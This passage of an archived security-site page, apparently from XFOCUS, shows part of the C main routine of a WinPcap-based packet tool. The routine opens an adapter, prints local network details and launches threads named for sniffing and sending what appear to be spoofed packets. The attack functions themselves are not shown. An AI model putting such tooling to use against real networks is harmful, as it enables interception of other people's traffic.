+      (lpadapter-&gt;hFile==INVALID_HANDLE_VALUE))<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketOpenAdapter 
+      Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketGetNetType(lpadapter,&amp;ntype))<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t\t*** 
+      Host Information 
+      ***\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[LinkTpye:]\t%d\t\t",ntype.LinkType);&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[LinkSpeed:]\t%d 
+      b/s\n",ntype.LinkSpeed);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;npflen=sizeof(ipbuff);&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketGetNetInfoEx(adapterlist[open-1],&amp;ipbuff,&amp;npflen))<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin=*(struct 
+      sockaddr_in 
+      *)&amp;(ipbuff.Broadcast);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[Broadcast:]\t%.16s\t",inet_ntoa(sin.sin_addr));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin=*(struct 
+      sockaddr_in 
+      *)&amp;(ipbuff.SubnetMask);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[SubnetMask:]\t%.16s\n",inet_ntoa(sin.sin_addr));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin=*(struct 
+      sockaddr_in 
+      *)&amp;(ipbuff.IPAddress);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[IPAddress:]\t%.16s\t",inet_ntoa(sin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myip=ntohl(sin.sin_addr.s_addr);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[MACAddress:]");<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nNot 
+      get enough 
+      data\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketFreePacket(lppackets);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketCloseAdapter(lpadapter);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if((lppackets=PacketAllocatePacket())==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketAllocatePacket 
+      send Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;rthread=CreateThread(NULL,0,sniff,(LPVOID)&amp;opti,0,&amp;threadrid);<BR>&nbsp;&nbsp;&nbsp;&nbsp;Sleep(300);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(getmine()) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketFreePacket(lppackets);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketFreePacket(lppacketr);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketCloseAdapter(lpadapter);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;Sleep(300);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if((opti==1) 
+      || 
+      (opti==2))<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(i=0;i&lt;total;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sthread=CreateThread(NULL,0,sendMASR,(LPVOID)&amp;opti,0,&amp;threadsid);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(30);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(1000);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if((opti==3) || (opti==4)) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sthread=CreateThread(NULL,0,sendMASR,(LPVOID)&amp;opti,0,&amp;threadsid);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(300);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(sthread);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sthread=CreateThread(NULL,0,sendSR,(LPVOID)&amp;opti,0,&amp;threadsid);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;WaitForSingleObject(sthread,INFINITE); 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(sthread);<BR>&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(rthread);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketGetStats(lpadapter,&amp;stat)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Warning: 
+      Unable to get the adapter 
+      stat\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\n%d 
+      packets received, %d packets lost 
+      !\n",stat.bs_recv,stat.bs_drop);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;PacketFreePacket(lppackets);<BR>&nbsp;&nbsp;&nbsp;&nbsp;PacketFreePacket(lppacketr);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;PacketCloseAdapter(lpadapter);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      0;<BR>} </TD></TR></TBODY></TABLE>
+<DIV class=footer>Copyright &copy; 1998-2003 XFOCUS Team. All Rights Reserved 
+</DIV></BODY></HTML>
